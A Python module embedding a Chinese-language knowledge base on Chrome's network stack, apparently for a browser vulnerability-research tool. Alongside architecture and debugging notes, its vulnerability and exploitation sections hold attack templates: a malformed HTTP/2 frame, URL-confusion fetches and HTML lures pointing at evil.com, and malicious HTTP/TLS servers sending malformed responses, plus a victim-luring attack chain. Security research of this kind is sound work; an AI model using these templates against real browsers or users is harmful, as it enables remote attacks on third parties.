"""
Chrome Network Stack Knowledge Base

Chrome网络栈处理所有HTTP/HTTPS通信，包括HTTP/2、HTTP/3(QUIC)等。
"""

NETWORK_OVERVIEW = """
# Chrome Network Stack Overview

Chrome网络栈是一个复杂的多层架构，处理从DNS到应用层的所有网络通信。

## 核心组件
1. **URLLoader**: 高层请求接口
2. **HttpCache**: HTTP缓存
3. **HttpNetworkTransaction**: HTTP事务处理
4. **Socket Pool**: 连接池管理
5. **SSL/TLS**: 加密通信
6. **QUIC**: HTTP/3实现

## 架构层次
```
Blink (ResourceLoader)
        ↓
    URLLoader
        ↓
   HttpCache
        ↓
HttpNetworkTransaction
        ↓
├── HttpBasicStream (HTTP/1.1)
├── SpdyStream (HTTP/2)
└── QuicStream (HTTP/3)
        ↓
   Socket Layer
        ↓
   DNS Resolver
```

## 关键目录
- `net/http/`: HTTP协议实现
- `net/quic/`: QUIC/HTTP3实现
- `net/spdy/`: HTTP/2实现
- `net/socket/`: Socket层
- `net/ssl/`: SSL/TLS
- `net/dns/`: DNS解析
"""

NETWORK_HTTP = """
# HTTP协议处理

## HTTP/1.1
- 文本协议
- 持久连接 (Keep-Alive)
- 管道化 (Pipelining，已废弃)

## HTTP/2 (SPDY)
- 二进制帧协议
- 多路复用
- 头部压缩 (HPACK)
- 服务器推送

### 帧类型
```
DATA (0x0): 数据帧
HEADERS (0x1): 头部帧
PRIORITY (0x2): 优先级
RST_STREAM (0x3): 流重置
SETTINGS (0x4): 设置
PUSH_PROMISE (0x5): 推送承诺
PING (0x6): 心跳
GOAWAY (0x7): 关闭连接
WINDOW_UPDATE (0x8): 流量控制
CONTINUATION (0x9): 头部续传
```

## HTTP/3 (QUIC)
- 基于UDP
- 内置加密
- 0-RTT握手
- 连接迁移

### QUIC帧类型
```
PADDING, PING, ACK
RESET_STREAM, STOP_SENDING
CRYPTO, NEW_TOKEN
STREAM, MAX_DATA
MAX_STREAM_DATA, MAX_STREAMS
DATA_BLOCKED, STREAM_DATA_BLOCKED
STREAMS_BLOCKED
NEW_CONNECTION_ID, RETIRE_CONNECTION_ID
PATH_CHALLENGE, PATH_RESPONSE
CONNECTION_CLOSE
```
"""

NETWORK_VULNERABILITY_PATTERNS = """
# Network Stack 常见漏洞模式

## 1. HTTP/2帧处理漏洞

### 模式
- 帧大小验证错误
- 流状态机错误
- HPACK解压缩问题

### 触发方式
```python
# 需要恶意服务器发送畸形响应
# 示例：畸形HEADERS帧

import socket
import ssl

# 构造畸形HTTP/2响应
frame = b'\\x00\\x00\\xff'  # 超长帧
frame += b'\\x01'  # HEADERS
frame += b'\\x04'  # END_HEADERS
frame += b'\\x00\\x00\\x00\\x01'  # Stream ID 1
frame += b'\\x41' * 0xff  # 畸形头部数据
```

### HTML触发
```html
<!-- 引导浏览器连接恶意服务器 -->
<img src="https://malicious-server.com/image.png" />
<script src="https://malicious-server.com/script.js"></script>
```

## 2. QUIC协议漏洞

### 模式
- 包解析错误
- 加密处理问题
- 连接状态机错误

### 触发位置
- `net/quic/quic_framer.cc`
- `net/third_party/quiche/`

## 3. TLS处理漏洞

### 模式
- 证书验证绕过
- 握手状态机错误
- 扩展解析问题

### 触发示例
```html
<!-- 连接使用恶意证书的服务器 -->
<iframe src="https://evil.com"></iframe>
```

## 4. DNS处理漏洞

### 模式
- DNS响应解析错误
- DNS over HTTPS问题
- 缓存投毒

### 位置
- `net/dns/dns_response.cc`
- `net/dns/dns_transaction.cc`

## 5. URL解析漏洞

### 模式
- 特殊字符处理
- Unicode规范化
- 协议混淆

### 触发示例
```javascript
// URL解析差异利用
fetch('http://evil.com%00@good.com/');
fetch('http://evil。com/');  // 全角点
fetch('http://evil．com/');  // Unicode点
```

## 6. Cookie处理漏洞

### 模式
- Cookie解析错误
- SameSite绕过
- Cookie前缀绕过

### 触发示例
```javascript
// 设置畸形Cookie
document.cookie = 'name=value; ' + 'a'.repeat(10000);
```

## 7. Cache处理漏洞

### 模式
- 缓存键冲突
- 响应拆分
- 缓存投毒

### 位置
- `net/http/http_cache.cc`
- `net/http/http_cache_transaction.cc`
"""

NETWORK_DEBUGGING = """
# Network Stack 调试技术

## Chrome调试标志
```bash
--log-net-log=netlog.json
--net-log-capture-mode=Everything
--enable-logging=stderr --v=1
```

## 内部调试页面
```
chrome://net-internals/
chrome://net-export/
```

## 关键源文件
- `net/http/http_network_transaction.cc`: HTTP事务
- `net/spdy/spdy_session.cc`: HTTP/2会话
- `net/quic/quic_chromium_client_session.cc`: QUIC会话
- `net/socket/ssl_client_socket_impl.cc`: SSL socket

## 抓包分析
```bash
# Wireshark抓包
# HTTP/2需要配置SSLKEYLOGFILE
export SSLKEYLOGFILE=/tmp/keys.log
chrome --user-data-dir=/tmp/chrome

# 在Wireshark中导入keys.log解密TLS
```

## 构造恶意服务器
```python
# Python恶意HTTP服务器示例
from http.server import HTTPServer, BaseHTTPRequestHandler

class MaliciousHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # 发送畸形响应
        self.send_response(200)
        self.send_header('Content-Length', '99999999')
        self.end_headers()
        self.wfile.write(b'x' * 100)  # 实际发送少量数据

HTTPServer(('0.0.0.0', 8080), MaliciousHandler).serve_forever()
```

## 使用curl测试
```bash
# 测试HTTP/2
curl -v --http2 https://target.com/

# 测试HTTP/3
curl -v --http3 https://target.com/
```
"""

NETWORK_EXPLOITATION = """
# Network Stack 利用技术

## 远程触发
网络栈漏洞通常需要恶意服务器配合:

1. **恶意服务器**: 发送畸形响应
2. **中间人攻击**: 修改网络流量
3. **DNS劫持**: 重定向到恶意服务器

## 触发链
```
1. 引导受害者访问页面
2. 页面加载恶意资源
3. 恶意服务器发送畸形响应
4. 触发浏览器漏洞
```

## HTML触发模板
```html
<!DOCTYPE html>
<html>
<body>
    <!-- 方法1: 图片 -->
    <img src="https://evil.com/trigger.png" />

    <!-- 方法2: 脚本 -->
    <script src="https://evil.com/trigger.js"></script>

    <!-- 方法3: iframe -->
    <iframe src="https://evil.com/"></iframe>

    <!-- 方法4: fetch -->
    <script>
    fetch('https://evil.com/api', {mode: 'no-cors'});
    </script>

    <!-- 方法5: WebSocket -->
    <script>
    new WebSocket('wss://evil.com/ws');
    </script>
</body>
</html>
```

## 服务器端PoC框架
```python
import asyncio
import ssl

async def handle_client(reader, writer):
    # 读取请求
    data = await reader.read(4096)

    # 发送畸形响应
    response = b'HTTP/1.1 200 OK\\r\\n'
    response += b'Content-Length: AAAA\\r\\n'  # 畸形长度
    response += b'\\r\\n'
    response += b'PAYLOAD'

    writer.write(response)
    await writer.drain()
    writer.close()

async def main():
    # 配置SSL
    ssl_ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ssl_ctx.load_cert_chain('cert.pem', 'key.pem')

    server = await asyncio.start_server(
        handle_client, '0.0.0.0', 443, ssl=ssl_ctx
    )
    await server.serve_forever()

asyncio.run(main())
```

## 考虑因素
- 网络栈在browser进程或network进程
- 需要考虑进程隔离
- 部分漏洞可能只导致DoS
"""


def get_network_knowledge() -> str:
    """获取完整的Network知识库"""
    return "\n\n".join([
        NETWORK_OVERVIEW,
        NETWORK_HTTP,
        NETWORK_VULNERABILITY_PATTERNS,
        NETWORK_DEBUGGING,
    ])


NETWORK_KNOWLEDGE_SECTIONS = {
    "overview": NETWORK_OVERVIEW,
    "http": NETWORK_HTTP,
    "patterns": NETWORK_VULNERABILITY_PATTERNS,
    "debugging": NETWORK_DEBUGGING,
    "exploitation": NETWORK_EXPLOITATION,
}
